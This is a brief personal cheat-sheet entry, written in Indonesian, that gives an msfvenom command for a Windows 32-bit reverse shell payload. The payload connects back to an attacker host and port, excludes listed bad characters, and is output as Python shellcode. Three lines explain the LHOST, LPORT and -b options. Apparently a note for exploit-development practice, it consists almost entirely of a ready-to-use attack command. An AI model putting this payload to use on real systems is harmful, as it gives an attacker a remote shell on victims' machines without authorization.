# msfvenom buat reverse shell windows 32bit

    msfvenom -p windows/shell_reverse_tcp LHOST=10.4.35.95 LPORT=9000 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f py -v payload

LHOST itu buat local host attacker
LPORT itu buat local port attacker
-b itu badcharnya
